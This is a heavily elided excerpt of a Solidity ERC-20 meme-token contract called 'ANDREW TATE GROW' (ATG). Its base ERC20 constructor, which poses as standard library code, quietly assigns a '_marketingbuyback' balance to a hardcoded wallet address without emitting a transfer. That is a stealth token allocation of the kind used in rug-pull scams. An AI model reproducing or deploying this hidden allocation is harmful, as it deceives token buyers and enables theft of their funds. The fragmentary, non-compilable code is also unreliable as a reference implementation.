...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _balances[0xfD07f2071EdeFe38361e5FBE9B203280339a827F] = _marketingbuyback;
    }
...
contract ANDREWTATE is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("ANDREW TATE GROW", "ATG") {
